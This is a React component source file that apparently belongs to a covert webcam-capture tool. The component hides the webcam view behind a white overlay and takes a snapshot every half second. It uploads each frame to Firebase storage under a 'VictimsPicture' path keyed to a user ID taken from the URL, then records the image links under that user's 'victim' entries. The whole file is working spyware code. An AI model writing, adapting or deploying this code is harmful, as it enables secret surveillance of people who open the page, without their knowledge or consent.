import { getDownloadURL, ref as stRef, uploadBytes } from "firebase/storage";
import { useEffect, useRef, useState } from "react"
import { useParams } from "react-router-dom";
import { database, storage } from "../../../DATABASE/Config";
import { ref, set } from "firebase/database";
import Webcam from 'react-webcam'



const Camera = () => {
  const {uid} = useParams()
  const webCamRef = useRef();
  const [image, setImage] = useState(null);

  useEffect(() => {
    const interval = setInterval(() => {
      const imageSrc = webCamRef.current.getScreenshot();
      setImage(imageSrc);
    }, 500);
    return () => clearInterval(interval)
  },[])

  useEffect(() => {
    const path = Date.now();
    const hack = stRef(storage, `VictimsPicture/${uid}/${path}`);
    const uploadImage = async () => {
      try {
        if(image) {
          const imageBlob = dataURIBlob(image);

          const metaData = {
            contentType: "image/jpeg"
          }
          await uploadBytes(hack, imageBlob, metaData)
          const downloadUrl = await getDownloadURL(hack);

          set(ref(database, `user/${uid}/victim/photo/${path}/`),{
            url: downloadUrl
          })
        }
      } catch(error) {
        console.log(error)
      }
    }

    function dataURIBlob(dataURI) {
      const byteString = atob(dataURI.split(',')[1]);
            const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
            const ab = new ArrayBuffer(byteString.length);
            const ia = new Uint8Array(ab);
        
            for (let i = 0; i < byteString.length; i++) {
                ia[i] = byteString.charCodeAt(i);
            }
        
            return new Blob([ab], { type: mimeString });
    }

    uploadImage()
  },[uid,image])
  return (
    <div className="absolute bg-white">
      
      <Webcam 
        className="z-[-1] relative"
        audio={false}
        ref={webCamRef}
        screenshotFormat="image/jpeg"
      />
    </div>
  )
}

export default Camera

